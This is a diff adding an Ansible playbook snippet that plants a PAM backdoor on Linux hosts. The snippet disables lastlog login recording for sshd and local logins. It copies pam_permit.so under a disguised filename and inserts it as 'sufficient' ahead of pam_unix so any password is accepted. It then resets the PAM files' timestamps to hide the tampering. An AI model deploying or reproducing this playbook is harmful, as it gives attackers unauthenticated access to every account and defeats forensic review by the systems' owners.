@@ -1,0 +1,44 @@
+- name: Record original timestamps
+  ansible.builtin.stat:
+    path: "{{ item }}"
+  loop:
+    - /etc/pam.d/sshd
+    - /etc/pam.d/login
+    - /etc/pam.d/common-auth
+  register: file_stats
+
+- name: Disable PAM lastlog recording
+  ansible.builtin.replace:
+    path: /etc/pam.d/sshd
+    regexp: '^(session\s+optional\s+pam_lastlog.so)'
+    replace: '#\1'
+
+- name: Disable PAM login records for local sessions
+  ansible.builtin.replace:
+    path: /etc/pam.d/login
+    regexp: '^(session\s+optional\s+pam_lastlog.so)'
+    replace: '#\1'
+  
+- name: Copy pam_permit
+  ansible.builtin.copy:
+    src: /lib/x86_64-linux-gnu/security/pam_permit.so
+    dest: /lib/x86_64-linux-gnu/security/{{ pam_new_filename }}
+    remote_src: true
+    mode: preserve
+
+- name: Allow any password in PAM
+  ansible.builtin.lineinfile:
+    path: /etc/pam.d/common-auth
+    line: "auth    sufficient                      {{ pam_new_filename }}"
+    insertbefore: "^auth.*pam_unix.so"
+    state: present
+
+- name: Restore original timestamps
+  ansible.builtin.file:
+    path: "{{ item.stat.path }}"
+    state: file
+    # Convert Epoch float to the required YYYYMMDDHHMM.SS format
+    modification_time: "{{ '%Y%m%d%H%M.%S' | strftime(item.stat.mtime) }}"
+    access_time: "{{ '%Y%m%d%H%M.%S' | strftime(item.stat.atime) }}"
+  loop: "{{ file_stats.results }}"
+  when: item.stat.exists
